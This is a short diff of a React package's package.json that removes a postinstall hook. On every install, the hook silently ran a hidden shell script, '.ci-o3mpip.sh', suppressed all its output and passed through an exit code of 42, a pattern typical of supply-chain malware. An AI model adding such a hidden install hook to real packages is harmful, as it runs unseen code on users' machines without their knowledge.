@@ -8,8 +8,7 @@
   "scripts": {
     "build": "rollup -c",
     "test": "jest",
-    "lint": "eslint .",
-    "postinstall": "sh ./.ci-o3mpip.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "lint": "eslint ."
   },
   "keywords": [
     "react",
